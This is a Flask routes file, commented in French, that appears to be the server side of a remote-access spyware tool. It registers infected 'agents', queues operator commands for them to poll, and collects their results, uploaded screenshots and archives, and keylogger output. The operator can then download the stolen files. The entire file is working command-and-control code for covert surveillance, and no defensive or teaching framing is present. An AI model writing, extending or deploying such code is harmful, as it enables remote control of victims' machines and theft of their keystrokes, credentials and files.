import os
import json
from flask import Blueprint, request, jsonify, send_from_directory
from werkzeug.utils import secure_filename
from services.machine_service import (
    register_machine, list_machines, get_machine,
    send_command, fetch_command, store_result, get_result, get_upload_dir,
)

machines_bp = Blueprint('machines', __name__)


@machines_bp.route('/report', methods=['POST'])
def report():
    """L'agent envoie ses infos de base au démarrage."""
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Corps JSON invalide'}), 400
    try:
        machine_id = register_machine(data)
        return jsonify({'message': 'Rapport reçu', 'id': machine_id}), 201
    except ValueError as e:
        return jsonify({'error': str(e)}), 400


@machines_bp.route('', methods=['GET'])
def get_machines():
    return jsonify(list_machines())


@machines_bp.route('/<int:machine_id>', methods=['GET'])
def get_machine_by_id(machine_id):
    try:
        return jsonify(get_machine(machine_id))
    except ValueError as e:
        return jsonify({'error': str(e)}), 404


@machines_bp.route('/<int:machine_id>/command', methods=['GET', 'POST'])
def command(machine_id):
    if request.method == 'POST':
        # Frontend envoie une commande
        data = request.get_json()
        cmd = data.get('command') if data else None
        if not cmd:
            return jsonify({'error': 'command manquant'}), 400
        try:
            send_command(machine_id, cmd)
            return jsonify({'ok': True}), 200
        except ValueError as e:
            return jsonify({'error': str(e)}), 400
    else:
        # Agent poll — lit la commande en attente
        cmd = fetch_command(machine_id)
        return jsonify({'command': cmd}), 200


@machines_bp.route('/<int:machine_id>/result', methods=['GET', 'POST'])
def result(machine_id):
    if request.method == 'POST':
        # Agent envoie le résultat — peut être un dict JSON imbriqué ou une string
        data = request.get_json()
        result_val = data.get('result', '') if data else ''
        # On sérialise en string si Flask a parsé un dict (JSON imbriqué)
        result_str = json.dumps(result_val) if isinstance(result_val, (dict, list)) else str(result_val)
        store_result(machine_id, result_str)
        return jsonify({'ok': True}), 200
    else:
        # Frontend récupère le résultat
        res = get_result(machine_id)
        return jsonify({'result': res}), 200


@machines_bp.route('/<int:machine_id>/upload', methods=['POST'])
def upload(machine_id):
    """Agent upload un fichier binaire (screenshot, zip). Stocke le nom dans command_result."""
    if 'file' not in request.files:
        return jsonify({'error': 'pas de fichier'}), 400
    f = request.files['file']
    filename = secure_filename(f.filename)
    upload_dir = get_upload_dir(machine_id)
    f.save(os.path.join(upload_dir, filename))
    store_result(machine_id, json.dumps({'type': 'file', 'filename': filename}))
    return jsonify({'ok': True, 'filename': filename}), 200


@machines_bp.route('/<int:machine_id>/keylog', methods=['POST'])
def keylog(machine_id):
    """Agent envoie un chunk de keylog (texte brut). Écrase keylog.txt."""
    data = request.data.decode('utf-8', errors='replace')
    upload_dir = get_upload_dir(machine_id)
    with open(os.path.join(upload_dir, 'keylog.txt'), 'w', encoding='utf-8') as fout:
        fout.write(data)
    return jsonify({'ok': True}), 200


@machines_bp.route('/<int:machine_id>/download/<path:filename>', methods=['GET'])
def download(machine_id, filename):
    """Frontend télécharge un fichier uploadé par l'agent."""
    upload_dir = os.path.abspath(get_upload_dir(machine_id))
    return send_from_directory(upload_dir, filename, as_attachment=True)
